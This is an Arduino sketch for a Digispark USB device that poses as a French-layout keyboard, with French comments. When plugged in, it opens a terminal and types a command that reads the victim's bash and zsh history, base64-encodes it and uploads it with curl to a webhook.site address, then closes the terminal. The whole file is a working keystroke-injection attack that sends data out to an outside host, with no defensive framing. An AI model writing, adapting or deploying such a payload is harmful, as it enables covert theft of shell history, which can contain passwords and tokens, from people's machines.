#define LAYOUT_FRENCH
#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.delay(5000); 
  
  // Ouvrir le terminal
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(1000);

  // Exécution de la commande 
  DigiKeyboard.println("cat ~/.bash_history ~/.zsh_history 2>/dev/null | base64 -w 0 | curl -d @- https://webhook.site/23fc7c81-3086-43ce-bebc-93984ca7cf20");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Fermeture du terminal
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {}
